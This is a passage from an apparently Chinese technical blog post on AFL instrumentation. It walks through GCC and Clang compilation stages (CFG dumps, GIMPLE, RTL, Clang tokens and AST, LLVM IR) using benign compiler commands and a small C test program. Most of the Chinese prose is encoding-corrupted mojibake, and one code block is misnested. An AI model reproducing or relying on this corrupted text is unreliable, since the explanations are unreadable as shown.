class="hljs-number">0</span>){<br><span class="hljs-keyword">return</span> -a;<br>}<br><span class="hljs-keyword">return</span> a;<br>}<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span>{<br><span class="hljs-type">int</span> a;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"This is a test!\nPlease give me an input number:"</span>);<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;a);<br><span class="hljs-comment">/* simulating branches */</span><br><span class="hljs-keyword">if</span>(a &gt; <span class="hljs-number">0</span>){<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d is a positive number~"</span>, a);<br>}<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(a &lt; <span class="hljs-number">0</span>){<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d is a negative number~"</span>, a);<br>}<span class="hljs-keyword">else</span> {<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">"zero detected!"</span>);<br>}<br><span class="hljs-comment">/* simulating a function call */</span><br>fun(a);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><ol><li>äº§ç”ŸASTå¯¹åº”çš„<code>.dot</code>æ–‡ä»¶ï¼š</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gcc afl_inst_test.c -fdump-tree-all-graph<br>$ <span class="hljs-built_in">ls</span><br>afl_inst_test.c<br>afl_inst_test.c.001t.tu<br>afl_inst_test.c.002t.class<br>afl_inst_test.c.003t.original<br>...<br>afl_inst_test.c.227t.optimized<br>afl_inst_test.c.227t.optimized.dot<br>afl_inst_test.c.311t.statistics<br>a.out<br></code></pre></td></tr></tbody></table></figure><ol start="2"><li>ä½¿ç”¨<code>dot</code>ç¨‹åºå°†mainå‡½æ•°å¯¹åº”<code>.dot</code>è½¬åŒ–ä¸ºå¯è§†å›¾ï¼š</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ dot -Tpng afl_inst_test.c.011t.cfg.dot -o main.png<br></code></pre></td></tr></tbody></table></figure><p><img src="/2022/12/27/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%89%96%E6%9E%90AFL%E6%8F%92%E6%A1%A9/3.png"></p><center>å›¾5 ç¤ºä¾‹CFG</center><h4 id="ä¸­é—´ç«¯ä¼˜åŒ–"><a href="#ä¸­é—´ç«¯ä¼˜åŒ–" class="headerlink" title="ä¸­é—´ç«¯ä¼˜åŒ–"></a>ä¸­é—´ç«¯ä¼˜åŒ–</h4><ul><li>GCCä¸­é—´ç«¯åŒ…æ‹¬ä¸¤ä¸ªéƒ¨åˆ†ï¼š<strong>GIMPLE</strong> å’Œ <strong>RTL</strong></li></ul><hr><p><strong>GIMPLEï¼š</strong></p><ul><li><p>æ´¾ç”Ÿè‡ªGCC <strong>GENERIC</strong>ï¼ˆä¹Ÿæ˜¯ä¸€ç§ä¸­é—´è¡¨ç¤ºï¼›æœ€åˆï¼Œä¸åŒçš„GCCå‰ç«¯ä¼šç”Ÿæˆä¾èµ–äºæ¶æ„çš„æ ‘è¡¨ç¤ºï¼Œè€ŒGENERICæ˜¯ä½œä¸ºä¸å¹³å°æ— å…³çš„æ ‘è¡¨ç¤ºè€Œå¼•å…¥çš„ï¼Œä»¥ç®€åŒ–å‰ç«¯å¼€å‘è¿‡ç¨‹ã€‚<strong>GENERIC</strong>çš„ç›®æ ‡æ˜¯ç”Ÿæˆ<strong>GIMPLE</strong> [5]ï¼‰</p></li><li><p>three-addressè¡¨ç¤ºï¼š</p><ul><li>å°†<strong>GENERIC</strong>è¡¨è¾¾å¼æ‹†æˆä¸è¶…è¿‡3ä¸ªæ“ä½œæ•°çš„å…ƒç»„ï¼ˆé™¤äº†å‡½æ•°è°ƒç”¨ï¼‰</li></ul></li><li><p>å¼•å…¥<strong>æš‚å­˜å™¨</strong>æ¥ä¿å­˜è®¡ç®—å¤æ‚è¡¨è¾¾å¼æ‰€éœ€çš„ä¸­é—´å€¼ï¼ŒGENERICä¸­ä½¿ç”¨çš„æ§åˆ¶ç»“æ„é™çº§ä¸º<strong>æ¡ä»¶è·³è½¬</strong>ï¼Œè¯æ³•<strong>ä½œç”¨åŸŸè¢«ç§»é™¤</strong>ï¼Œè€Œå¼‚å¸¸åŒºåŸŸåˆ™è¢«è½¬æ¢ä¸ºè¾¹ä¸Šçš„å¼‚å¸¸åŒºåŸŸæ ‘</p></li><li><p>ä½¿ç”¨ä¸€ä¸ªâ€gimplifierâ€å°†<strong>GENERIC</strong>è½¬åŒ–ä¸º<strong>GIMPLE</strong></p></li><li><p>åŒ…æ‹¬â€<strong>High GIMPLE</strong>â€œå’Œâ€<strong>Low GIMPLE</strong>â€œ</p><ul><li>High GIMPLEåŒ…å«ä¸€äº›å®¹å™¨è¯­å¥ï¼Œå¦‚è¯æ³•èŒƒå›´å’ŒåµŒå¥—è¡¨è¾¾å¼ï¼Œæ´¾ç”Ÿè‡ª<strong>å‰ç«¯ASTæ ‘</strong>æˆ–<strong>GENERIC</strong>ï¼Œç„¶ååŸºäºHigh GIMPLEç”ŸæˆLow GIMPLE</li><li>Low GIMPLEåˆ™æ˜¾ç¤ºæ‰€æœ‰æ§åˆ¶å’Œå¼‚å¸¸è¡¨è¾¾å¼çš„éšå«è·³è½¬</li></ul></li><li><p>Cå’ŒC++å‰ç«¯ç›´æ¥ä»å‰ç«¯ASTæ ‘è½¬åŒ–ä¸º<strong>GIMPLE</strong>ï¼Œè€Œä¸æ˜¯è½¬åŒ–ä¸º<strong>GENERIC</strong></p></li><li><p>ä½¿ç”¨æ ‡å¿—<code>-fdump-tree-gimple</code>æ¥ç”Ÿæˆç±»Cçš„è¡¨ç¤º</p></li></ul><p><span class="github-emoji"><span>âœ‹</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/270b.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> è¯´ç™½äº†ï¼Œ<strong>GIMPLE</strong>å°±æ˜¯å¹²äº†ä¸¤ä»¶äº‹ï¼š</p><p>â€‹<span class="github-emoji"><span>1âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> åˆ é™¤é«˜çº§ç»“æ„ï¼Œå¦‚forï¼Œwhileå¾ªç¯ã€ç”¨gotoå’Œè·³è½¬æ›¿æ¢ã€‘</p><p>â€‹<span class="github-emoji"><span>2âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> ç®€åŒ–è¡¨è¾¾å¼ï¼ˆé€šè¿‡å¼•å…¥ä¸´æ—¶å˜é‡ï¼‰</p><p><span class="github-emoji"><span>âš </span><img src="https://github.githubassets.com/images/icons/emoji/unicode/26a0.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> å¯ä»¥åœ¨Low GIMPLEå®ç°GIMPLEå±‚çº§çš„Passï¼</p><p><span class="github-emoji"><span>ğŸŒ°</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f330.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <code> if (a || b) stmt;</code>  ==&gt;</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> (a) <span class="hljs-keyword">goto</span> L1;<br><span class="hljs-keyword">if</span> (b) <span class="hljs-keyword">goto</span> L1; <span class="hljs-keyword">else</span> <span class="hljs-keyword">goto</span> L2;<br>L1:<br>stmt;<br>L2:<br></code></pre></td></tr></tbody></table></figure><hr><p><strong>GCCç”ŸæˆGIMPLE</strong>ï¼š</p><p>Low GIMPLE:</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gcc afl_inst_test.c -fdump-tree-gimple<br>$ <span class="hljs-built_in">cat</span> afl_inst_test.c.004t.gimple <br>fun (int a)<br>{<br>  int D.2258;<br><br>  <span class="hljs-keyword">if</span> (a &gt; 0) goto &lt;D.2256&gt;; <span class="hljs-keyword">else</span> goto &lt;D.2257&gt;;<br>  &lt;D.2256&gt;:<br>  D.2258 = -a;<br>  <span class="hljs-built_in">return</span> D.2258;<br>  &lt;D.2257&gt;:<br>  D.2258 = a;<br>  <span class="hljs-built_in">return</span> D.2258;<br>}<br>...<br></code></pre></td></tr></tbody></table></figure><p>High GIMPLE:</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gcc afl_inst_test.c -fdump-tree-gimple-raw<br>$ <span class="hljs-built_in">cat</span> afl_inst_test.c.004t.gimple<br>fun (int a)<br>gimple_bind &lt;<br>  int D.2258;<br><br>  gimple_cond &lt;gt_expr, a, 0, &lt;D.2256&gt;, &lt;D.2257&gt;&gt;<br>  gimple_label &lt;&lt;<span class="hljs-string">D.2256&gt;&gt;</span><br><span class="hljs-string">  gimple_assign &lt;negate_expr, D</span>.2258, a, NULL, NULL&gt;<br>  gimple_return &lt;D.2258 NULL&gt;<br>  gimple_label &lt;&lt;<span class="hljs-string">D.2257&gt;&gt;</span><br><span class="hljs-string">  gimple_assign &lt;parm_decl, D</span>.2258, a, NULL, NULL&gt;<br>  gimple_return &lt;D.2258 NULL&gt;<br>&gt;<br>...<br></code></pre></td></tr></tbody></table></figure><hr><p><strong>RTL:</strong></p><ul><li>å¯„å­˜å™¨è½¬æ¢è¯­è¨€ <em>Register Transfer Language</em>ï¼Œä¸æ±‡ç¼–è¯­è¨€å¾ˆæ¥è¿‘</li><li>è¡¨ç¤ºä¸€ä¸ªå…·æœ‰æ— é™æ•°é‡å¯„å­˜å™¨çš„æŠ½è±¡æœºå™¨ï¼Œç»“æ„ç±»ä¼¼äºLispå’ŒCè¯­è¨€çš„æ··åˆ</li><li>åœ¨ç”Ÿæˆ<strong>RTL</strong>ä»£ç åï¼ŒGCCç¼–è¯‘å™¨åœ¨å°†å…¶è½¬æ¢åˆ°æ±‡ç¼–è¯­è¨€ä¹‹å‰è¿›è¡Œäº†ä¸åŒçš„<strong>åº•å±‚ä¼˜åŒ–</strong> [7]</li><li>ç”±äº<strong>RTL</strong>è¡¨ç¤ºçš„ç”Ÿæˆå’Œä¼˜åŒ–çš„ç¨‹åºåœ¨ç¼–è¯‘è¿‡ç¨‹çš„åç«¯ï¼Œè¿™æ„å‘³ç€å®ƒä¾èµ–äºç¡¬ä»¶ï¼Œè€Œä¸åŒ…å«ç¨‹åºçš„æ‰€æœ‰ä¿¡æ¯</li></ul><p><span class="github-emoji"><span>âœ‹</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/270b.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> è¯´ç™½äº†ï¼Œ<strong>RTL</strong>å°±æ˜¯å¹²äº†ä¸¤ä»¶äº‹ï¼š</p><p><span class="github-emoji"><span>1âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> å°†<strong>GIMPLE</strong>è½¬åŒ–ä¸ºä¸ç¡¬ä»¶ç›¸å…³çš„RTLè¯­è¨€</p><p><span class="github-emoji"><span>2âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> åœ¨RTLåŸºç¡€ä¸Šè¿›è¡Œ<strong>åº•å±‚ä¼˜åŒ–</strong></p><p><span class="github-emoji"><span>âš </span><img src="https://github.githubassets.com/images/icons/emoji/unicode/26a0.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> åŒæ ·çš„ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å®ç°åŸºäºRTLå±‚çº§çš„Passï¼</p><p><span class="github-emoji"><span>ğŸŒ°</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f330.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <code>b = a - 1</code>  ==&gt;</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(set (reg/v:SI 59 [ b ])<br>     (plus:SI (reg/v:SI 60 [ a ]<br>              (const_int -1 [0xffffffff]))))<br></code></pre></td></tr></tbody></table></figure><ul><li>RTLä¸­çš„ä¸€äº›ä¼˜åŒ–Passesï¼š</li></ul><table><thead><tr><th>Name</th></tr></thead><tbody><tr><td>RTL generation</td></tr><tr><td>Loop optimization</td></tr><tr><td>Jump bypassing</td></tr><tr><td>If conversion</td></tr><tr><td>Instruction combination</td></tr><tr><td>Register movement</td></tr><tr><td>Instruction scheduling</td></tr><tr><td>Register allocation</td></tr><tr><td>Final</td></tr></tbody></table><hr><p><strong>GCCç”ŸæˆRTLï¼š</strong></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gcc afl_inst_test.c -fdump-rtl-all<br>$ <span class="hljs-built_in">cat</span> afl_inst_test.c.310r.dfinish <br><br>;; Function fun (fun, funcdef_no=0, decl_uid=2248, cgraph_uid=0, symbol_order=0)<br><br>(note 1 0 4 NOTE_INSN_DELETED)<br>(note 4 1 28 2 [bb 2] NOTE_INSN_BASIC_BLOCK)<br>(insn/f 28 4 29 2 (<span class="hljs-built_in">set</span> (mem:DI (pre_dec:DI (reg/f:DI 7 sp)) [0  S8 A8])<br>        (reg/f:DI 6 bp)) <span class="hljs-string">"afl_inst_test.c"</span>:3 57 {*pushdi2_rex64}<br>     (nil))<br>(insn/f 29 28 30 2 (<span class="hljs-built_in">set</span> (reg/f:DI 6 bp)<br>        (reg/f:DI 7 sp)) <span class="hljs-string">"afl_inst_test.c"</span>:3 81 {*movdi_internal}<br>     (nil))<br>...<br></code></pre></td></tr></tbody></table></figure><h4 id="åç«¯ç”Ÿæˆ"><a href="#åç«¯ç”Ÿæˆ" class="headerlink" title="åç«¯ç”Ÿæˆ"></a>åç«¯ç”Ÿæˆ</h4><ul><li>åç«¯ä¸ºæŒ‡å®šçš„ç›®æ ‡å¹³å°ç”Ÿæˆæ±‡ç¼–ä»£ç </li></ul><p>GCCç”Ÿæˆç›®æ ‡å¹³å°æ±‡ç¼–ä»£ç ï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gcc -S afl_inst_test.c<br>$ <span class="hljs-built_in">cat</span> afl_inst_test.s<br></code></pre></td></tr></tbody></table></figure><h3 id="2-Clang"><a href="#2-Clang" class="headerlink" title="2. Clang"></a>2. Clang</h3><h4 id="å››ä¸ªé˜¶æ®µ-1"><a href="#å››ä¸ªé˜¶æ®µ-1" class="headerlink" title="å››ä¸ªé˜¶æ®µ"></a>å››ä¸ªé˜¶æ®µ</h4><ul><li>ä¸GCCç±»ä¼¼ï¼Œä¸å†èµ˜è¿°</li></ul><h4 id="å‰ç«¯åˆ†æ-1"><a href="#å‰ç«¯åˆ†æ-1" class="headerlink" title="å‰ç«¯åˆ†æ"></a>å‰ç«¯åˆ†æ</h4><ul><li>Clang<strong>å‰ç«¯ç®¡çº¿</strong>ï¼š</li></ul><p><img src="/2022/12/27/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%89%96%E6%9E%90AFL%E6%8F%92%E6%A1%A9/6.png"></p><center>å›¾6 Clangå‰ç«¯æµæ°´çº¿</center><p><strong>é¢„å¤„ç†</strong>ï¼š</p><ul><li>C/C++é¢„å¤„ç†å™¨åœ¨<strong>è¯æ³•åˆ†æä¹‹å‰</strong>æ‰§è¡Œï¼Œä¸»è¦åŠŸèƒ½æ˜¯<ul><li>å±•å¼€å®</li><li>å±•å¼€åŒ…å«æ–‡ä»¶</li><li>æ ¹æ®å„ç§ä»¥#å¼€å¤´çš„é¢„å¤„ç†å™¨æŒ‡ç¤ºç•¥å»éƒ¨åˆ†ä»£ç </li></ul></li></ul><hr><p><strong>è¯æ³•åˆ†æï¼š</strong></p><ul><li>å¤„ç†æºä»£ç çš„æ–‡æœ¬è¾“å…¥ï¼Œå°†è¯­è¨€ç»“æ„åˆ†è§£ä¸ºä¸€ç»„å•è¯å’Œæ ‡è®°ï¼Œå»é™¤æ³¨é‡Šã€ç©ºç™½ã€åˆ¶è¡¨ç¬¦ç­‰</li><li>clangè¯æ³•åˆ†æè¾“å‡ºç»“æœï¼š</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ clang -cc1 -dump-tokens afl_inst_test.c<br>...<br></code></pre></td></tr></tbody></table></figure><p>ä¾‹å¦‚ï¼Œåœ¨<code>fun()</code>[Line 4-6] å‡½æ•°å†…çš„ifè¯­å¥é«˜äº®è¾“å‡ºæ˜¯ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> <span class="hljs-string">'if'</span> [StartOfLine] [LeadingSpace]Loc=&lt;afl_inst_test.c:<span class="hljs-number">4</span>:<span class="hljs-number">2</span>&gt;<br>l_paren <span class="hljs-string">'('</span>Loc=&lt;afl_inst_test.c:<span class="hljs-number">4</span>:<span class="hljs-number">4</span>&gt;<br>identifier <span class="hljs-string">'a'</span>Loc=&lt;afl_inst_test.c:<span class="hljs-number">4</span>:<span class="hljs-number">5</span>&gt;<br>greater <span class="hljs-string">'&gt;'</span> [LeadingSpace]Loc=&lt;afl_inst_test.c:<span class="hljs-number">4</span>:<span class="hljs-number">7</span>&gt;<br>numeric_constant <span class="hljs-string">'0'</span> [LeadingSpace]Loc=&lt;afl_inst_test.c:<span class="hljs-number">4</span>:<span class="hljs-number">9</span>&gt;<br>r_paren <span class="hljs-string">')'</span>Loc=&lt;afl_inst_test.c:<span class="hljs-number">4</span>:<span class="hljs-number">10</span>&gt;<br>l_brace <span class="hljs-string">'{'</span>Loc=&lt;afl_inst_test.c:<span class="hljs-number">4</span>:<span class="hljs-number">11</span>&gt;<br><span class="hljs-keyword">return</span> <span class="hljs-string">'return'</span> [StartOfLine] [LeadingSpace]Loc=&lt;afl_inst_test.c:<span class="hljs-number">5</span>:<span class="hljs-number">3</span>&gt;<br>minus <span class="hljs-string">'-'</span> [LeadingSpace]Loc=&lt;afl_inst_test.c:<span class="hljs-number">5</span>:<span class="hljs-number">10</span>&gt;<br>identifier <span class="hljs-string">'a'</span>Loc=&lt;afl_inst_test.c:<span class="hljs-number">5</span>:<span class="hljs-number">11</span>&gt;<br>semi <span class="hljs-string">';'</span>Loc=&lt;afl_inst_test.c:<span class="hljs-number">5</span>:<span class="hljs-number">12</span>&gt;<br>r_brace <span class="hljs-string">'}'</span> [StartOfLine] [LeadingSpace]Loc=&lt;afl_inst_test.c:<span class="hljs-number">6</span>:<span class="hljs-number">2</span>&gt;<br></code></pre></td></tr></tbody></table></figure><hr><p><strong>è¯­æ³•åˆ†æï¼š</strong></p><ul><li><p>å°†è¯æ³•åˆ†æäº§ç”Ÿçš„æ ‡è®°æµä½œä¸ºè¾“å‡ºï¼Œè¾“å‡ºè¯­æ³•æ ‘ï¼ˆASTï¼‰</p></li><li><p>ä¸€ä¸ªASTèŠ‚ç‚¹è¡¨æ˜å£°æ˜ã€è¯­å¥å’Œç±»å‹</p></li><li><p>è¯­æ³•è§£æå™¨æ¥å—å¹¶å¤„ç†åœ¨è¯æ³•é˜¶æ®µç”Ÿæˆçš„æ ‡è®°åºåˆ—ï¼Œæ¯å½“å‘ç°ä¸€ç»„è¦æ±‚çš„æ ‡è®°åœ¨ä¸€èµ·çš„æ—¶å€™ï¼Œæ­¤æ—¶ä¼šç”Ÿæˆä¸€ä¸ªASTèŠ‚ç‚¹</p><ul><li><p>å¦‚æ¯å½“å‘ç°ä¸€ä¸ªæ ‡è®°tok::kw_ifæ—¶ï¼Œå°±ä¼šè°ƒç”¨<code>ParseIfStatement()</code>å‡½æ•°å¤„ç†ifè¯­å¥ä½“ä¸­çš„æ‰€æœ‰æ ‡è®°ï¼Œå¹¶ä¸ºå®ƒä»¬ç”Ÿæˆæ‰€å¿…é¡»çš„å­©å­ASTèŠ‚ç‚¹å’Œä¸€ä¸ªIfStmtæ ¹èŠ‚ç‚¹</p></li><li><pre><code class="c">// lib/Parse/ParseStmt.cpp...  case tok::kw_if:                  // C99 6.8.4.1: if-statement    return ParseIfStatement(TrailingElseLoc);  case tok::kw_switch:              // C99 6.8.4.2: switch-statement    return ParseSwitchStatement(TrailingElseLoc);...<figure class="highlight asciidoc"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br><span class="hljs-bullet">* </span>Clangå¹¶ä¸åœ¨è§£æä¹‹åéå†ASTï¼Œè€Œæ˜¯åœ¨ASTèŠ‚ç‚¹ç”Ÿæˆè¿‡ç¨‹ä¸­å³æ—¶æ£€æŸ¥ç±»å‹<br><br><span class="hljs-bullet">* </span>è¯­æ³•åˆ†æ<span class="hljs-strong">**è¯†åˆ«è§£æé”™è¯¯**</span><br><br><span class="hljs-bullet">* </span>Clangç”Ÿæˆ<span class="hljs-strong">**AST**</span>æ ‘ï¼š<br><br><span class="hljs-code">```bash</span><br><span class="hljs-code">$ clang -fsyntax-only -Xclang -ast-dump afl_inst_test.c</span><br><span class="hljs-code"># or clang -cc1 -ast-dump afl_inst_test.c [9]</span><br></code></pre></td></tr></tbody></table></figure></code></pre></li></ul></li><li><p>ASTæ ‘çš„å¯è§†åŒ–ç•Œé¢ï¼š</p></li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ clang -fsyntax-only -Xclang -ast-view afl_inst_test.c<br></code></pre></td></tr></tbody></table></figure><hr><p><strong>ç”ŸæˆLLVM IR</strong></p><ul><li><p>ç»è¿‡è¯æ³•åˆ†æå’Œè¯­ä¹‰åˆ†æçš„è”åˆå¤„ç†ä¹‹åï¼ŒClangä¼šè°ƒç”¨<code>CodeGenAction()</code>ç¼–è¯‘<strong>AST</strong>ä»¥ç”Ÿæˆ<strong>LLVM IR</strong></p></li><li><p>å‰ç«¯æµæ°´çº¿ç»“æŸï¼</p></li></ul><h4 id="ä¸­é—´ç«¯ä¼˜åŒ–-11"><a href="#ä¸­é—´ç«¯ä¼˜åŒ–-11" class="headerlink" title="ä¸­é—´ç«¯ä¼˜åŒ–[11]"></a>ä¸­é—´ç«¯ä¼˜åŒ–<sup>[11]</sup></h4><ul><li><p>LLVMä¸­é—´è¡¨ç¤ºIRæ˜¯è¿æ¥å‰ç«¯å’Œåç«¯çš„ä¸­æ¢ï¼Œè®©LLVMèƒ½å¤Ÿè§£æå¤šç§æºè¯­è¨€ï¼Œä¸ºå¤šç§ç›®æ ‡ç”Ÿæˆä»£ç </p></li><li><p>å‰ç«¯äº§ç”ŸIRï¼Œåç«¯ä¹Ÿæ¥æ”¶IR</p></li><li><p>å¼•å…¥IRçš„å‡ºå‘ç‚¹ï¼š<span class="github-emoji"><span>1âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> è§£å†³ä¸åŒè¯­è¨€æºä»£ç çš„å·®å¼‚æ€§ï¼› <span class="github-emoji"><span>2âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> ä¾¿äºç”Ÿæˆä¸åŒå¹³å°ç›¸å¼‚çš„æœºå™¨æŒ‡ä»¤é›†</p><ul><li>é€šç”¨æ€§</li><li>é«˜çº§IRèƒ½å¤Ÿè®©ä¼˜åŒ–å™¨è½»æ¾æç‚¼å‡ºåŸå§‹æºä»£ç çš„æ„å›¾ï¼›ä½çº§IRè®©ç¼–è¯‘å™¨èƒ½å¤Ÿæ›´å®¹æ˜“ç”Ÿæˆä¸ºç‰¹å®šç¡¬ä»¶ä¼˜åŒ–çš„ä»£ç </li></ul></li><li><p>IRçš„ä¸‰ç§ç­‰ä»·å½¢å¼ï¼š</p><ul><li>é©»ç•™å†…å­˜çš„è¡¨ç¤ºï¼ˆæŒ‡ä»¤ç±»ç­‰ï¼‰</li><li>ç£ç›˜ä¸Šä»¥ç©ºé—´é«˜æ•ˆæ–¹å¼ç¼–ç çš„ä½è¡¨ç¤ºï¼ˆbitcodeæ–‡ä»¶ï¼‰</li><li>ç£ç›˜ä¸Šçš„äººç±»å¯è¯»æ–‡æœ¬è¡¨ç¤ºï¼ˆLLVMæ±‡ç¼–æ–‡ä»¶ï¼‰</li></ul></li><li><p>IRçš„å·¥ä½œæµå›¾ï¼š</p></li></ul><p><img src="/2022/12/27/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%89%96%E6%9E%90AFL%E6%8F%92%E6%A1%A9/7.png"></p><center>å›¾7 LLVM IRå·¥ä½œæµå›¾</center><hr><p><strong>Clangç”ŸæˆIRï¼š</strong></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// sum.c</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> {<br>  <span class="hljs-keyword">return</span> a+b;<br>}<br></code></pre></td></tr></tbody></table></figure><ul><li>ç”Ÿæˆbitcodeï¼š</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ clang sum.c -emit-llvm -c -o sum.bc<br></code></pre></td></tr></tbody></table></figure><ul><li>ç”Ÿæˆæ±‡ç¼–è¡¨ç¤ºï¼š</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ clang sum.c -emit-llvm -S -c -o sum.ll<br></code></pre></td></tr></tbody></table></figure><ul><li>æ±‡ç¼–LLVM IRæ±‡ç¼–æ–‡æœ¬ä»¥ç”Ÿæˆbitcodeï¼š</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ llvm-as sum.ll -o sum.bc<br></code></pre></td></tr></tbody></table></figure><ul><li>åç¼–è¯‘bitcodeä¸ºIRæ±‡ç¼–ï¼š</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ llvm-dis sum.bc -o sum.ll<br></code></pre></td></tr></tbody></table></figure><ul><li>llvm-extractå·¥å…·æå–IRå‡½æ•°ã€å…¨å±€å˜é‡ï¼Œè¿˜èƒ½ä»IRæ¨¡å—ä¸­åˆ é™¤å…¨å±€å˜é‡ï¼š</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ llvm-extract -func=<span class="hljs-built_in">sum</span> sum.bc -o sum-fn.bc<br></code></pre></td></tr></tbody></table></figure><h4 id="åç«¯ç”Ÿæˆ-12"><a 